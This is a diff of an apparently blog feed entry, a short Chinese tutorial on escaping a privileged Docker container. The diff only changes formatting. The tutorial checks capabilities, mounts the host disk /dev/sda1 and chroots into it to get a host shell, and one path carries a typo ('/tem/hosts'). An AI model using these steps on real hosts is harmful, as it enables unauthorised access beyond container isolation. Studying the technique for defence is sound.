@@ -9,14 +9,23 @@
         <title>docker逃逸</title>
         <link rel="alternate" href="http://example.com/2023/10/27/docker%E9%80%83%E9%80%B8/"/>
         <content type="html">&lt;p&gt;&lt;em&gt;特权模式&lt;/em&gt;逃逸&lt;/p&gt;
-&lt;p&gt;当容器启动加上–privileged选项时，容器可以访问宿主机上所有设备&lt;/p&gt;
-&lt;p&gt;启动一个特权容器&lt;br&gt;&lt;code&gt;sudo docker run --rm --privileged -it ubuntu:18.04 bash&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;判断容器是否特权启动&lt;br&gt;&lt;code&gt;查看磁盘，默认情况下容器执行fdisk -l 是无法查看的&lt;/code&gt;&lt;br&gt;&lt;code&gt;fdisk -l&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;查看capEff值，特权值为0000003fffffffff&lt;br&gt;&lt;code&gt;cat /proc/self/status | grep CapEff&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;#创建一个挂载目录&lt;br&gt;&lt;code&gt;mkdir /tmp/hosts&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;#查看宿主机磁盘文件&lt;br&gt;&lt;code&gt;fdisk -l&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;#挂载到创建的目录&lt;br&gt;&lt;code&gt;mount /dev/sda1 /tem/hosts/&lt;/code&gt;&lt;br&gt;&lt;code&gt;cd /tmp/hosts/&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;#通过chroot切换bash&lt;br&gt;&lt;code&gt;chroot ./ bash&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;当容器启动加上–privileged 选项时，容器可以访问宿主机上所有设备&lt;/p&gt;
+&lt;p&gt;启动一个特权容器&lt;br&gt;
+ &lt;code&gt;sudo docker run --rm --privileged -it ubuntu:18.04 bash&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;判断容器是否特权启动&lt;br&gt;
+ &lt;code&gt;查看磁盘，默认情况下容器执行fdisk -l 是无法查看的&lt;/code&gt; &lt;br&gt;
+ &lt;code&gt;fdisk -l&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;查看 capEff 值，特权值为 0000003fffffffff&lt;br&gt;
+ &lt;code&gt;cat /proc/self/status | grep CapEff&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;#创建一个挂载目录&lt;br&gt;
+ &lt;code&gt;mkdir /tmp/hosts&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;#查看宿主机磁盘文件&lt;br&gt;
+ &lt;code&gt;fdisk -l&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;#挂载到创建的目录&lt;br&gt;
+ &lt;code&gt;mount /dev/sda1 /tem/hosts/&lt;/code&gt; &lt;br&gt;
+ &lt;code&gt;cd /tmp/hosts/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;#通过 chroot 切换 bash&lt;br&gt;
+ &lt;code&gt;chroot ./ bash&lt;/code&gt;&lt;/p&gt;
 </content>
         <updated>2023-10-27T06:33:01.000Z</updated>
     </entry>
